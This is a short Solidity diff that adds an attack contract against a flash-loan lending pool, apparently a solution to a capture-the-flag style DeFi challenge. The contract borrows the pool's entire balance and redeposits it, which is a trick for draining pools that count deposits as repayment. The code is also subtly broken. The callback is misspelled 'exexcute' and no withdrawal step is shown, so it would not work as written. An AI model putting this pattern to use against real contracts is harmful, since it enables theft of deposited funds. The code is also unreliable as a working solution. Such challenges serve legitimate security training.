@@ -40,5 +40,17 @@ contract SideEntranceLenderPool {
 }
 
 contract AttackSideEntrance {
-    // function here
+    SideEntranceLenderPool public pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+    }
+
+    function exexcute() external payable {
+        pool.deposit{value: msg.value}();
+    }
 }
